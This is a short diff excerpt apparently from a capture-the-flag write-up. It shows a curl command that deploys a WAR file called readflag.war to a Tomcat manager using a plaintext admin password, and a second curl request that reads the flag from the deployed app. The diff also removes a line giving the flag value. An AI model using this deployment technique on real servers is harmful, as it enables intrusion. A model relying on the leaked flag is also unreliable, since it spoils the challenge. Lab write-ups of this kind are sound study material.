@@ -43,7 +43,6 @@ curl -u tomcatadm:"T0mc@t_s3cret_p@ss!" --upload-file /tmp/readflag.war "http://
 After deployment, the flag was retrieved by accessing the deployed application:
 curl http://localhost:8080/readflag/
 
-Flag value: LLPE{)m_th3_m3@nag3r_no7w
 
 Technical Summary:
 This exploitation demonstrates several critical security failures:
